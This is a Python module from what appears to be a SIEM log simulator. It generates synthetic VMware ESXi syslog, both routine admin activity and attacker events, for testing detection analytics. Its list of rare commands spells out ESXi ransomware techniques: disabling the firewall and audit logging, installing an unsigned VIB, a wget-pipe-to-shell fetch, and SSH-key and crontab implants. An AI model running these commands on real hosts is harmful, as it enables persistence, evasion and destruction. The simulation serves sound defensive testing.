# modules/vmware_esxi.py
# Simulates VMware ESXi host syslog for the XSIAM vmware_esxi_raw dataset.
#
# Architecture note:
#   ESXi hosts forward native syslog (vmsyslogd) to a remote collector. In XSIAM the
#   Broker VM Syslog applet is configured Format=Raw, Vendor=VMware, Product=ESXi on a
#   dedicated listening port; the Marketplace "VMware ESXi" content pack supplies the
#   parsing rule (regexcapture -> parsed_fields JSON) and the modeling rule that maps
#   those fields to XDM and the Virtualization Stories.  This is PLAIN SYSLOG, not CEF:
#   there is no __firewall_type-style routing key in the body, so the collector
#   distinguishes ESXi from the other syslog sources BY PORT (its own syslog_port),
#   exactly as cisco_asa (1514), apache (1515) and infoblox (1516) are separated today.
#
# What the pack normalizes (confirmed from the Marketplace pack changelog, not from an
# in-tenant parse here):
#   xdm.source.user.username / xdm.*.identity.*   (auth + identity, pack >= 1.0.8/1.0.20)
#   xdm.source.ipv4                                (client address on auth events)
#   xdm.event.outcome                              (success / failure)
#   target process name / path / command_line      (vmkernel process-lifecycle, >= 1.0.21)
#   virtualization fields + Virtualization Stories  (>= 1.0.10)
#
# Analytics alignment (Cortex "alerts by data source: VMware virtualization servers
# syslogs" — the authoritative list):
#   The data source drives EXACTLY TWO shipped XSIAM analytics, both behavioral-rarity
#   over the COMMAND executed on the host:
#     - "Uncommon command executed on a virtualization host" (ATT&CK T1059.012 Hypervisor
#       CLI) — a command rarely seen on virtualization hosts in the environment.
#     - "Uncommon command was executed on a device" (+ a "...sensitive command..."
#       variation) — the generic device-level form.
#   Both train 30 days, activate after 14, test single-event, dedup 1 day, keyed on the
#   command string and the host. NO auth/identity/VM-lifecycle analytic is published for
#   this data source. Design consequence: the detector is a RARITY model, so it needs a
#   stable COMMON-command baseline (the benign shell_command + crond events) for a RARE
#   command to stand out. The one on-demand analytic threat (uncommon_host_command) fires
#   commands from the rare pool; it is marked analytic but UNVERIFIED in-tenant — every
#   other module in this repo earned "confirmed" only after a live fire -> ingest -> detect
#   pass (_local_validation/threat_harness.py), and this must do the same.
#   The remaining generators (ssh_brute_force, root_login_rare_source, ssh_service_enabled,
#   local_account_created, mass_vm_power_off, remote_syslog_disabled) are faithful ESXi
#   attacker TTPs with no analytic on this data source: background + hunting/correlation,
#   not offered on-demand. Note the account-manipulation / evasion TTPs ALSO surface as
#   uncommon commands when run from the shell — which is the analytic path above.

import random
import time
import zlib
from datetime import datetime, timezone

try:
    from modules import mgmt_plane
    from modules.azure_common import activity_weight
    from modules.session_utils import (correlated_or_random_user, get_random_user,
                                        random_external_ip, rare_external_ip)
except ImportError:
    import mgmt_plane
    from azure_common import activity_weight
    from session_utils import (correlated_or_random_user, get_random_user,
                               random_external_ip, rare_external_ip)


NAME         = "VMware ESXi"
DESCRIPTION  = "Simulates VMware ESXi host syslog for the XSIAM vmware_esxi_raw dataset."
XSIAM_PARSER = "vmware_esxi_raw"
CONFIG_KEY   = "vmware_esxi_config"
SOURCE_IDENTIFIER = "af01292940d7426594d3d3e55ae17ee0"   # Cribl generic UUID -> <vendor>_<product>_raw
XSIAM_VENDOR = "VMware"
XSIAM_PRODUCT = "ESXi"

# A real ESXi host is QUIET: outside the ambient vpxa poll it changes state rarely, so
# the default cadence is far below the usual 1/s — ~0.01 events/s (one every 100 s). The
# dashboard reads this (ModuleState -> _module_default_interval); vmware_esxi_config can
# override it with its own `event_interval`. Operators can still dial it up per run.
EVENT_INTERVAL = 100.0

last_threat_event_time = 0

# ── Syslog facilities (RFC 5424 numeric) ──────────────────────────────────────
# As a real ESXi 8.0.3 host sends them (captured on the NYC-Office broker): hostd /
# Vpxa / envoy / fdm under local4 (<166> info), vmkernel / vmkwarning under local6
# (<182> / <180>), vobd and the interactive shell under user (<14>), the SSH / ESXShell
# service notices under user.notice (<13>), crond under cron (<78>), sshd-session under
# auth (<38> / <35>) and its pam_unix lines under authpriv (<85> / <86>).
_FAC_USER     = 1
_FAC_AUTH     = 4
_FAC_CRON     = 9
_FAC_AUTHPRIV = 10
_FAC_LOCAL4   = 20
_FAC_LOCAL6   = 22
_SEV_NUM = {"info": 6, "notice": 5, "warning": 4, "error": 3, "verbose": 7}


# ── Threat catalog (positional metadata, firewall-module style) ───────────────
# analytic=True  -> offered on-demand (dashboard Fire panel / MCP fire_event / CLI),
#                   targets a generic XSIAM analytic that consumes the normalized XDM.
# analytic=False -> background + hunting/correlation only, never offered on-demand.
_THREATS = [
    # The ONE on-demand analytic. VMware virtualization syslogs drive exactly two shipped
    # analytics, both behavioral-rarity over the command executed on the host (see the
    # module docstring). This generator fires commands from the RARE pool; the benign
    # shell_command / crond events supply the COMMON-command baseline they train against.
    {"event": "uncommon_host_command", "weight": 6, "analytic": True,
     "xsiam_alert": "Uncommon command executed on a virtualization host"},
    # Non-analytic: realistic ESXi attacker TTPs with no analytic on this data source.
    # They build baseline, feed hunts, and anchor cross-source correlation/scenario
    # stitching by ESXi host + admin identity. The account-manipulation / evasion ones
    # also show up as uncommon commands when run from the shell (the analytic path above).
    {"event": "ssh_brute_force", "weight": 5, "analytic": False, "xsiam_alert": None},
    {"event": "vuln_scan", "weight": 4, "analytic": False, "xsiam_alert": None},
    {"event": "root_login_rare_source", "weight": 3, "analytic": False, "xsiam_alert": None},
    {"event": "ssh_service_enabled", "weight": 3, "analytic": False, "xsiam_alert": None},
    {"event": "local_account_created", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "mass_vm_power_off", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "remote_syslog_disabled", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "vm_disk_export", "weight": 2, "analytic": False, "xsiam_alert": None},
    # Top-tier custom-rule targets (no shipped analytic; clear log evidence). See the
    # generators and docs/modules/vmware-esxi.md "Custom-rule targets".
    {"event": "guest_ops_exec", "weight": 3, "analytic": False, "xsiam_alert": None},
    {"event": "datastore_upload", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "vm_disk_attach", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "kernel_module_load", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "promiscuous_mode", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "unplanned_reboot", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "snmp_external_target", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "log_rotation_disabled", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "config_harvest", "weight": 2, "analytic": False, "xsiam_alert": None},
    {"event": "permission_denied_burst", "weight": 2, "analytic": False, "xsiam_alert": None},
]

# Commands admins routinely type in the host shell — the 30-day training baseline for
# the "uncommon command" analytics. Emitted often (benign shell_command) so a rare
# command stands out. Keep these genuinely mundane (inventory, status, patch checks).
_COMMON_COMMANDS = [
    "esxcli system version get",
    "esxcli network ip connection list",
    "vim-cmd hostsvc/hostsummary",
    "vim-cmd vmsvc/getallvms",
    "vim-cmd vmsvc/power.getstate 9",
    "esxcli storage filesystem list",
    "esxcli software vib list",
    "esxcli system syslog config get",
    "esxcli network firewall get",
    "esxcli network ip interface ipv4 get",
    "esxcli storage core path list",
    "esxtop -b -n 1",
    "vmware -vl",
]

# crond's scheduled jobs on an ESXi 8 host, verbatim from a real 8.0.3 host.
_CRON_JOBS = [
    "/bin/hostd-probe.sh ++group=host/vim/vmvisor/hostd-probe/stats/sh,securitydom=hostdProbeDom",
    "python ++group=host/vim/vmvisor/systemStorage,securitydom=systemStorageMonitorDom "
    "/sbin/systemStorageMonitor.pyc",
    "/usr/lib/vmware/misc/bin/vmkmemstats.sh ++group=host/vim/vmvisor/vmkmemstats.sh,mem=groupMax",
    "/sbin/auto-backup.sh ++group=host/vim/vmvisor/auto-backup.sh",
    "/bin/crx-cli ++securitydom=crxCliGcDom gc",
]

# Uncommon / attacker-interesting commands: interactive shells, account manipulation,
# defense evasion, VIB/signing bypass, encryption & secure-boot downgrade, audit
# tampering, destructive/encryptor staging, downloaded tooling. Rarely (or never) seen on
# a healthy host, so they trip the behavioral-rarity analytics. This set mirrors the
# ESXi-ransomware command catalog SIEM vendors (Splunk/VMware security research) detect on.
# "%s" is filled with a rare external IP at emit time.
_RARE_COMMANDS = [
    "/bin/esxcli system account add -i support -d svc -p ***** -c *****",
    "/bin/esxcli system account remove -i vmadmin",
    "/bin/esxcli system account set -i root -e false",
    "/bin/esxcli system permission set -i support -r Admin",
    "/bin/esxcli system permission unset -i vmadmin",
    "/bin/esxcli network firewall set --enabled false",
    "/bin/esxcli network firewall unload",
    "/bin/vim-cmd hostsvc/lockdown_disable",
    "/bin/esxcli system syslog config set --loghost=''",
    "/bin/esxcli system auditrecords remote disable",
    "/bin/esxcli system auditrecords local disable",
    "/bin/esxcli software acceptance set --level CommunitySupported",
    "/bin/esxcli software vib install -v /tmp/.x/evil.vib --force --no-sig-check",
    "/bin/esxcli system settings encryption set --require-secure-boot=false",
    "/bin/esxcli system settings encryption set --require-exec-installed-only=false",
    "/bin/esxcli system maintenanceMode set -e true",
    "/bin/esxcli system coredump file set --unconfigure",
    "/bin/python -c 'import socket,subprocess,os'",
    "/bin/sh -c 'wget http://%s/x.sh -O- | sh'",
    "/bin/dd if=/dev/zero of=/vmfs/volumes/datastore1/pad bs=1M count=512",
    "/bin/chmod +x /tmp/.hidden/encryptor && /tmp/.hidden/encryptor",
    # Persistence TTPs — SSH key implant and crontab implant (ESXi ransomware staples).
    "/bin/sh -c 'echo ssh-rsa AAAAB3Nza... attacker >> /etc/ssh/keys-root/authorized_keys'",
    "/bin/sh -c 'echo \"* * * * * /tmp/.x/implant\" >> /var/spool/cron/crontabs/root'",
    "/bin/esxcli software vib remove -n esx-tboot",
]


def get_threat_names():
    """Every threat name (analytic or not); long-running sessions emit them all."""
    return [t["event"] for t in _THREATS]


def get_threat_info():
    """Per-threat metadata, same shape the firewall modules expose (event,
    display_name, analytic, xsiam_alert, weight). threat_catalog reads this to build
    the on-demand list — only analytic entries with an xsiam_alert are offered."""
    return [{"event": t["event"], "display_name": t["event"],
             "analytic": t["analytic"], "xsiam_alert": t["xsiam_alert"],
             "weight": t["weight"]}
            for t in _THREATS]


# ── Config access ─────────────────────────────────────────────────────────────

def _conf(config):
    return config.get(CONFIG_KEY, {}) or {}


def _hosts(config):
    """Cluster hostnames. A stable set keeps each ESXi host a real entity for
    host-baselined analytics instead of a stream of one-off names."""
    return _conf(config).get("hosts", ["esxi01.corp.local", "esxi02.corp.local",
                                        "esxi03.corp.local"])


def _admins(config):
    """Local/service ESXi identities. root plus a couple of named operators; the
    human operators correlate to a session_utils user when a session context is
    present so ESXi auth stitches to the same identity seen on cloud/Windows feeds."""
    return _conf(config).get("admins", ["root", "svc_vcenter", "vmadmin"])


def _disabled_accounts(config):
    """Accounts that exist on the host but are disabled (NoAccess / locked). A login
    attempt against one is a distinct signal from an unknown user."""
    return _conf(config).get("disabled_accounts", ["svc_legacy", "auditor"])


def _former_accounts(config):
    """Accounts that were deleted/offboarded. A login attempt against one surfaces as an
    unknown user (SSH 'Invalid user' / console 'no such user')."""
    return _conf(config).get("former_accounts", ["jdoe", "contractor1", "tempadmin"])


def _datastores(config):
    return _conf(config).get("datastores", ["datastore1", "ds-prod-nfs01", "ds-vsan-01"])


def _vms(config):
    return _conf(config).get("vms", ["DC01", "FILE01", "SQL01", "WEB01", "APP01",
                                     "EXCH01", "BACKUP01"])


def _mgmt_ip(config):
    return _conf(config).get("mgmt_ip", "127.0.0.1")


def _vcenter(config):
    """(name, ip) of the managing vCenter. vpxa is present on these hosts, so they ARE
    vCenter-managed; vCenter drives the host through the built-in 'vpxuser' account."""
    c = _conf(config)
    return (c.get("vcenter_name", "vcenter.corp.examplecorp.local"),
            c.get("vcenter_ip", "10.0.20.20"))


def _backup_proxy(config):
    """(ip, account) of the VM backup proxy that snapshots and reads VMs over NFC. The
    legitimate counterpart to the vm_disk_export threat (same NFC file-read mechanism)."""
    c = _conf(config)
    return c.get("backup_proxy_ip", "10.0.20.15"), c.get("backup_account", "svc_vmbackup")


# ── Timestamp / header ─────────────────────────────────────────────────────────

def _ts(dt=None):
    """ISO8601 UTC with millisecond precision and a 'Z' suffix — the format modern
    ESXi (6.5+) emits and the XSIAM pack's parsing rule extracts for _time. A BSD
    'Mmm dd HH:MM:SS' stamp (legacy ESXi 6.0) carries no year/zone and leaves _time
    unset, which breaks every time-windowed analytic — so never emit that here."""
    t = dt or datetime.now(timezone.utc)
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


def _pri(facility, severity_word):
    return facility * 8 + _SEV_NUM.get(severity_word, 6)


# ── ESXi 8 line builders ───────────────────────────────────────────────────────
# Every shape below is taken from a real ESXi 8.0.3 host (NYC-Office broker,
# 2026-11-04). ESXi 8 differs from 7.x in ways the content pack's parsing / modeling
# rules care about: hostd writes `Hostd[pid]: [Originator@6876 ...]` (no "info
# hostd[pid]" level prefix) with a `sid=` session id, interactive shell commands are
# `shell[pid]: [user]: <command>` (the ONLY form modeled as Command Execution with a
# command line), SSH runs as `sshd-session`, and envoy replaced rhttpproxy.

def _stable(seed, lo, hi):
    """A per-entity constant in [lo, hi] (stable daemon pids, VM ids, host IPs)."""
    return lo + zlib.crc32(seed.encode()) % (hi - lo + 1)


_EVENT_SEQ = {}


def _ev(host):
    """hostd event keys are a per-host running counter (Event 44382, 44383, ...)."""
    n = _EVENT_SEQ.get(host) or _stable(host, 40000, 60000)
    _EVENT_SEQ[host] = n + 1
    return n


_TASK_SEQ = {}


def _task_id(host):
    n = _TASK_SEQ.get(host) or _stable(host + "task", 80000, 90000)
    _TASK_SEQ[host] = n + random.randint(1, 4)
    return n


def _sid(seed=None):
    """hostd session id: 8 hex starting 52. One per login session; seeded so the lines
    of one operator session share it."""
    if seed is None:
        return f"52{random.randint(0, 0xffffff):06x}"
    return f"52{zlib.crc32(seed.encode()) & 0xffffff:06x}"


def _opid(kind="esxui"):
    """Operation ids by client: Host Client `esxui-xxxx-xxxx`, esxcli `esxcli-xx-xxxx`,
    vim-cmd `vim-cmd-xx-xxxx`, vCenter (vpxuser) bare 8-hex."""
    if kind == "esxcli":
        return f"esxcli-{random.randint(0, 0xff):02x}-{random.randint(0, 0xffff):04x}"
    if kind == "vim-cmd":
        return f"vim-cmd-{random.randint(0, 0xff):02x}-{random.randint(0, 0xffff):04x}"
    if kind == "vpx":
        return f"{random.randint(0, 0xffffffff):08x}"
    return f"esxui-{random.randint(0, 0xffff):x}-{random.randint(0, 0xffff):04x}"


def _hostd_line(config, host, severity, sub, body, opid=None, user=None, dt=None,
                sid=None, proc="Hostd"):
    """A hostd (or Vpxa / Fdm) line, ESXi 8 form:
      <PRI>TS HOST Hostd[pid]: [Originator@6876 sub=.. opID=.. sid=.. user=..] body
    System-originated events carry no opID/sid/user; operator actions carry all three."""
    if sub.startswith("vpx"):
        proc = "Vpxa"
    pid = _stable(host + proc, 1049700, 1049760) + random.randint(0, 45)
    orig = f"[Originator@6876 sub={sub}"
    if opid:
        orig += f" opID={opid}"
        orig += f" sid={sid or _sid(f'{host}|{user}|{opid[:5]}')}"
    if user:
        orig += f" user={user}"
    orig += "]"
    return f"<{_pri(_FAC_LOCAL4, severity)}>{_ts(dt)} {host} {proc}[{pid}]: {orig} {body}"


def _sshd_line(config, host, body, dt=None, pam=False, severity="info", pid=None):
    """An sshd-session line (auth facility), or its pam_unix line (authpriv) when `pam`
    is "auth" / "session" / "account" / True (session)."""
    pid = pid or random.randint(4200000, 4400000)
    if pam:
        mod = pam if pam in ("auth", "session", "account") else "session"
        pri = _pri(_FAC_AUTHPRIV, "notice" if mod == "auth" else "info")
        return f"<{pri}>{_ts(dt)} {host} sshd-session[{pid}]: pam_unix(sshd:{mod}): {body}"
    return f"<{_pri(_FAC_AUTH, severity)}>{_ts(dt)} {host} sshd-session[{pid}]: {body}"


def _vobd_line(config, host, vob_id, body, dt=None, correlator="GenericCorrelator", micros=None):
    """A vobd correlator line:  vobd[pid]:  [GenericCorrelator] <us>us: [vob.<id>] <body>"""
    pid = _stable(host + "vobd", 1048800, 1048999)
    micros = micros or random.randint(10**13, 2 * 10**13)
    return (f"<{_pri(_FAC_USER, 'info')}>{_ts(dt)} {host} vobd[{pid}]:  [{correlator}] "
            f"{micros}us: [{vob_id}] {body}")


def _vob_audit(config, host, vob_id, body):
    """The vobd triple ESXi writes for user-facing events: the GenericCorrelator and
    UserLevelCorrelator copies of vob.user.<x>, plus the esx.audit.<x> audit event."""
    audit = "esx.audit." + vob_id.split("vob.user.", 1)[-1]
    us = random.randint(10**13, 2 * 10**13)
    return [_vobd_line(config, host, vob_id, body, micros=us),
            _vobd_line(config, host, vob_id, body, correlator="UserLevelCorrelator", micros=us),
            _vobd_line(config, host, audit, body + ("" if body.endswith(".") else "."),
                       correlator="UserLevelCorrelator", micros=us + random.randint(100, 400))]


_BIN_PREFIX = ("esxcli", "vim-cmd", "localcli", "esxtop", "vmware", "vmkfstools", "esxcfg-")


def _typed(cmd):
    """What an operator types: `/bin/esxcli system ...` -> `esxcli system ...`."""
    for p in ("/bin/", "/sbin/"):
        if cmd.startswith(p) and cmd[len(p):].startswith(_BIN_PREFIX):
            return cmd[len(p):]
    return cmd


def _cmd_line(config, host, cmd, dt=None, user="root", pid=None):
    """An interactive shell command:  shell[pid]: [root]: esxcli system account list
    This is the form the pack models as Command Execution with
    xdm.target.process.command_line — what the 'uncommon command' analytics key on."""
    pid = pid or random.randint(4200000, 4400000)
    return (f"<{_pri(_FAC_USER, 'info')}>{_ts(dt)} {host} shell[{pid}]: "
            f"[{user}]: {_typed(cmd)}")


def _cli_trace(config, host, cmd, user="root"):
    """What hostd logs behind a shell esxcli / vim-cmd: a loopback API login as root,
    the Solo.VmwareCLI dispatch of the namespace, and the logout."""
    typed = _typed(cmd)
    if typed.startswith("esxcli "):
        ns = []
        for tok in typed.split()[1:]:
            if tok.startswith("-") or "=" in tok:
                break
            ns.append(tok)
        opid = _opid("esxcli")
        sid = _sid()
        agent = "pyvmomi 8.0.2.0.1 internal Python/3.11.11 (VMkernel; 8.0.3; x86_64)"
        dispatch = ".".join(ns)
        return [
            _hostd_line(config, host, "info", "Vimsvc.HaSessionManager",
                        f"Accepted password for user {user} from 127.0.0.1 - session="
                        f"{sid}-{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffff):04x}-"
                        f"{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffffffffffff):012x}",
                        opid=opid, sid=sid),
            _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {_ev(host)} : User {user}@127.0.0.1 logged in as {agent}",
                        opid=opid, sid=sid),
            _hostd_line(config, host, "info", "Solo.VmwareCLI", f"Dispatch {dispatch}",
                        opid=opid, sid=sid, user=user),
            _hostd_line(config, host, "info", "Solo.VmwareCLI", f"Dispatch {dispatch} done",
                        opid=opid, sid=sid, user=user),
            _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {_ev(host)} : User {user}@127.0.0.1 logged out (login time: "
                        f"{_login_time()}, number of API invocations: {random.randint(3, 9)}, "
                        f"user agent: {agent})", opid=opid, sid=sid, user=user),
        ]
    if typed.startswith("vim-cmd "):
        opid = _opid("vim-cmd")
        return [_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                            f"Event {_ev(host)} : User {user}@127.0.0.1 logged in as "
                            f"VMware-client/8.0.3", opid=opid, sid=_sid())]
    return []


def _shell_cmds(config, host, cmds, user="root", start=False):
    """One interactive shell session's commands (shared shell pid), each followed by the
    hostd trace esxcli / vim-cmd leave. `start` prepends the session-start line."""
    pid = random.randint(4200000, 4400000)
    logs = []
    if start:
        logs.append(f"<{_pri(_FAC_USER, 'info')}>{_ts()} {host} shell[{pid}]: "
                    f"Interactive shell session started")
    for cmd in cmds:
        logs.append(_cmd_line(config, host, cmd, user=user, pid=pid))
        logs.extend(_cli_trace(config, host, cmd, user=user))
    return logs


def _crond_line(config, host, cmd):
    """crond's job launch: crond[pid]: USER root pid N cmd <cmd>  (cron facility)."""
    return (f"<{_pri(_FAC_CRON, 'info')}>{_ts()} {host} crond[{_stable(host + 'crond', 1049200, 1049299)}]: "
            f"USER root pid {random.randint(4200000, 4400000)} cmd {cmd}")


def _vmkernel_line(config, host, subsystem, body, severity="info", dt=None):
    """A vmkernel line:  vmkernel: cpuN:world)<Subsystem>: <body>  (local6). Warnings go
    to the vmkwarning program as `vmkwarning: cpuN:world)WARNING: <Subsystem>: <body>`."""
    cpu = random.randint(0, 15)
    world = random.randint(1048600, 1310000)
    if severity in ("warning", "error"):
        sub = subsystem if subsystem.startswith("WARNING: ") else f"WARNING: {subsystem}"
        return (f"<{_pri(_FAC_LOCAL6, 'warning')}>{_ts(dt)} {host} vmkwarning: "
                f"cpu{cpu}:{world}){sub}: {body}")
    return (f"<{_pri(_FAC_LOCAL6, 'info')}>{_ts(dt)} {host} vmkernel: cpu{cpu}:{world})"
            f"{subsystem}: {body}")


def _fdm_line(config, host, body, severity="info", dt=None):
    """An fdm (vSphere HA Fault Domain Manager agent) line, hostd-style header."""
    return _hostd_line(config, host, severity, "Cluster", body, dt=dt, proc="Fdm")


def _host_ip(config, host):
    """The host's management address (envoy's listener). `host_ips` in config wins."""
    ips = _conf(config).get("host_ips") or {}
    return ips.get(host) or f"10.0.20.{_stable(host, 31, 60)}"


def _envoy_line(config, host, method, path, status, client, flags="via_upstream",
                upstream="127.0.0.1:8309", tag="- -", rx=0, tx=None):
    """An envoy-access line (ESXi 8's reverse proxy on 443):
      envoy-access[pid]: GET /ui/... 200 via_upstream - 0 331 gzip 0 0 0 CLIENT HTTP/2
      TLSv1.2 HOSTIP:443 127.0.0.1:PORT HTTP/1.1 - 127.0.0.1:8309 - -"""
    pid = _stable(host + "envoy", 1049500, 1049530)
    tx = random.randint(200, 20000) if tx is None else tx
    if flags == "via_upstream":
        tail = (f"{random.randint(0, 3)} {random.randint(0, 3)} 0 {client} HTTP/2 TLSv1.2 "
                f"{_host_ip(config, host)}:443 127.0.0.1:{random.randint(10000, 65000)} "
                f"HTTP/1.1 - {upstream} {tag}")
        mid = f"{status} via_upstream - {rx} {tx} gzip"
    else:   # rejected at the proxy: no upstream connection
        tail = f"0 - - {client} HTTP/1.1 TLSv1.2 {_host_ip(config, host)}:443 - - - - - -"
        mid = f"{status} {flags} - {rx} {tx} -"
    return (f"<{_pri(_FAC_LOCAL4, 'info')}>{_ts()} {host} envoy-access[{pid}]: "
            f"{method} {path} {mid} {tail}")


def _task_lines(config, host, entity, method, opid=None, user=None, sid=None,
                status="success"):
    """hostd TaskManager pair:  Task Created : haTask-9-vim.VirtualMachine.powerOff-80334
    then  Task Completed : ... Status success."""
    tid = f"haTask-{entity}-vim.{method}-{_task_id(host)}"
    return [_hostd_line(config, host, "info", "Vimsvc.TaskManager", f"Task Created : {tid}",
                        opid=opid, user=user, sid=sid),
            _hostd_line(config, host, "info", "Vimsvc.TaskManager",
                        f"Task Completed : {tid} Status {status}")]


def _vm_id(config, vm):
    return _stable(vm, 1, 40)


def _vm_event(config, host, vm, phrase, opid=None, user=None, sid=None, gap=" "):
    """A VM state event:  Event N : <vm> on <host> in ha-datacenter <phrase>.  Real hosts
    print two spaces before the host on the stopping / powered-off pair (gap="  ")."""
    return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                       f"Event {_ev(host)} : {vm} on{gap}{host} in ha-datacenter {phrase}",
                       opid=opid, user=user, sid=sid)


def _login_time():
    t = datetime.now(timezone.utc)
    return t.strftime("%A, %d %B, %Y %I:%M:%S %p")


_BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like "
               "Gecko) Chrome/154.0.0.0 Safari/537.36 Edg/154.0.0.0")


def _api_login(config, host, user, src, agent=_BROWSER_UA, opid=None, sid=None):
    """A vSphere API / Host Client login: the HaSessionManager accept line plus the
    'logged in as <agent>' event (neither carries user=; the session is not yet bound)."""
    opid = opid or _opid()
    sid = sid or _sid(f"{host}|{user}|{src}")
    session = (f"{sid}-{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffff):04x}-"
               f"{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffffffffffff):012x}")
    return [
        _hostd_line(config, host, "info", "Vimsvc.HaSessionManager",
                    f"Accepted password for user {user} from {src} - session={session}",
                    opid=opid, sid=sid),
        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                    f"Event {_ev(host)} : User {user}@{src} logged in as {agent}",
                    opid=opid, sid=sid),
    ]


def _resolve_admin(config, session_context, external=False):
    """(user, src_ip). Prefer a correlated session_utils identity so ESXi auth stitches
    to the same person seen elsewhere; fall back to a local ESXi account. `external`
    forces a public client IP (for off-net / attacker logons)."""
    if session_context and not external:
        ui = correlated_or_random_user(session_context, preferred_device_type="workstation")
        if ui and ui.get("username"):
            return ui["username"], ui.get("ip") or _mgmt_ip(config)
    user = random.choice(_admins(config))
    if external:
        return user, random_external_ip(config)
    # Remote administration comes from the shared ops-team jump hosts / admin subnet
    # (mgmt_plane) — the same sources the firewall modules use. Console-only generators
    # (DCUI, the syslog-logHost "Set called with key") hardcode loopback themselves.
    return user, mgmt_plane.admin_source(config)


# ── Benign generators ───────────────────────────────────────────────────────────
# Routine day-to-day ESXi operations that build a clean per-host baseline. These are
# separate named helpers (not a wall of if-branches) so the operations the environment
# must always exercise — SSH/ESXi Shell enable+disable, interactive shell logins, VM
# power on/off — are first-class, discoverable, and individually weighted. Each returns
# a syslog string or a list of strings; the dispatcher in log_simulator handles both.

def _vmx_sub(config, vm):
    """hostd's per-VM logger: Vmsvc.vm:/vmfs/volumes/<datastore uuid>/<vm>/<vm>.vmx"""
    ds = random.choice(_datastores(config))
    c = zlib.crc32(ds.encode())
    uuid = f"{c:08x}-{(c >> 3) & 0xffffffff:08x}-{c & 0xffff:04x}-{zlib.crc32(vm.encode()) & 0xffffffffffff:012x}"
    return f"Vmsvc.vm:/vmfs/volumes/{uuid}/{vm}/{vm}.vmx"


def _ssh_session_open(config, host, user, src, method="keyboard-interactive/pam"):
    """A successful SSH logon as ESXi 8 logs it: sshd-session connection / accept / pam
    session / 'Session opened', the vobd triple, and hostd's 'SSH session was opened'."""
    pid = random.randint(4200000, 4400000)
    port = random.randint(30000, 65000)
    return ([_sshd_line(config, host, f"Connection from {src} port {port}", pid=pid),
             _sshd_line(config, host, f"Accepted {method} for {user} from {src} port {port} ssh2", pid=pid)]
            + _vob_audit(config, host, "vob.user.ssh.session.opened",
                         f"SSH session was opened for '{user}@{src}'.")
            + [_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : SSH session was opened for '{user}@{src}'."),
               _sshd_line(config, host, f"session opened for user {user} by (uid=0)",
                          pam="session", pid=pid),
               _sshd_line(config, host, f"Session opened for '{user}' on /dev/char/pty/t{random.randint(0, 3)}",
                          pid=pid)])


def _ssh_auth_failure(config, host, user, src, invalid=False, pid=None):
    """One failed SSH logon (ESXi 8 keyboard-interactive): pam_lsass + pam_unix auth
    failure, sshd-session 'error: PAM: Authentication failure', vobd triple, hostd event.
    An unknown account logs OpenSSH's 'Invalid user' first."""
    pid = pid or random.randint(4200000, 4400000)
    port = random.randint(30000, 65000)
    logs = []
    if invalid:
        logs.append(_sshd_line(config, host, f"Invalid user {user} from {src} port {port}", pid=pid))
    logs += [
        f"<{_pri(_FAC_USER, 'error')}>{_ts()} {host} sshd-session[{pid}]: [module:pam_lsass]"
        f"pam_do_authenticate: error [login:{user}][error code:2]",
        _sshd_line(config, host, f"authentication failure; logname= uid=0 euid=0 tty=ssh "
                                 f"ruser= rhost={src}  user={user}", pam="auth", pid=pid),
        _sshd_line(config, host, f"error: PAM: Authentication failure for "
                                 f"{'illegal user ' if invalid else ''}{user} from {src}",
                   severity="error", pid=pid),
    ]
    logs += _vob_audit(config, host, "vob.user.ssh.session.failed",
                       f"SSH login has failed for '{user}@{src}'.")
    logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                            f"Event {_ev(host)} : SSH login has failed for '{user}@{src}'."))
    return logs


def _service_toggle_lines(config, host, user, svc, enable, opid=None):
    """SSH / ESXi Shell enable or disable as ESXi 8 logs it (Host Client): the service
    notice (SSH[pid] / ESXShell[pid]), the vobd triple, hostd's system event, the
    ServiceSystem running-status line, and the operator event 'SSH for the host <h> has
    been enabled' — the only line that names the operator (user= tag)."""
    opid = opid or _opid()
    state = "enabled" if enable else "disabled"
    if svc == "SSH":
        notice = f"SSH[{random.randint(4200000, 4400000)}]: SSH login {state}"
        vob, vob_body = f"vob.user.ssh.{state}", f"SSH access has been {state}"
        sys_body, key = f"SSH access has been {state}.", "TSM-SSH"
        op_body = f"SSH for the host {host} has been {state}"
    else:
        notice = f"ESXShell[{random.randint(4200000, 4400000)}]: ESXi shell login {state}"
        vob, vob_body = f"vob.user.esxshell.{state}", f"ESXi Shell has been {state}"
        sys_body, key = f"The ESXi command line shell has been {state}.", "TSM"
        op_body = f"ESXi Shell for the host {host} has been {state}"
    return ([f"<{_pri(_FAC_USER, 'notice')}>{_ts()} {host} {notice}"]
            + _vob_audit(config, host, vob, vob_body)
            + [_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr", f"Event {_ev(host)} : {sys_body}"),
               _hostd_line(config, host, "info", "Hostsvc.ServiceSystem",
                           f"{key} running status is {'true' if enable else 'false'}",
                           opid=opid, user=user),
               _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : {op_body}", opid=opid, user=user)])


def _vm_power_lines(config, host, vm, action, user=None, opid=None, sid=None):
    """A VM power operation as hostd logs it. Operator-driven actions log the transition
